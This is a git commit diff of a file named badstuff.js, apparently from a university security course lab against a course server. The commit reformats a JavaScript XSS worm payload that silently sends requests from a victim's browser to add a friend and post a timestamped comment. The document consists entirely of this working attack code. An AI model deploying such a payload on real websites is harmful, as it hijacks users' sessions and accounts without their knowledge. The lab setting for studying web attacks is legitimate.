4a40b427d5a8553383d81e27b57101d4d9db0516
spencerroth3 <34780564+spencerroth3@users.noreply.github.com>
2021-12-14 18:26:52 -0500

    Update badstuff.js

--- badstuff.js
+++ badstuff.js
@@ -1,1 +1,9 @@
-var worm = new XMLHttpRequest(); worm.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=93', true); worm.setRequestHeader("Content-type","application/x-www-form-urlencoded"); worm.send();var date = new Date(); var comment =["http://csec380-core.csec.rit.edu:86/add_comment.php?id=93&comment=Friend added on ", date.getDate(), "/", date.getMonth(), "/", date.getFullYear(), " @ ", date.getHours(), ":" , date.getMinutes()]; var c = new XMLHttpRequest(); c.open('GET', comment.join(‘’), true); c.send();
+var worm = new XMLHttpRequest(); 
+worm.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=93', true); 
+worm.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+worm.send();
+var date = new Date(); 
+var comment ="Friend added on "+ date.getDate() + "/" + (date.getMonth()+1)  + "/" + date.getFullYear() + " @ "  + date.getHours() + ":"  + date.getMinutes();
+var c = new XMLHttpRequest(); 
+c.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=93&comment='+comment, true); 
+c.send();
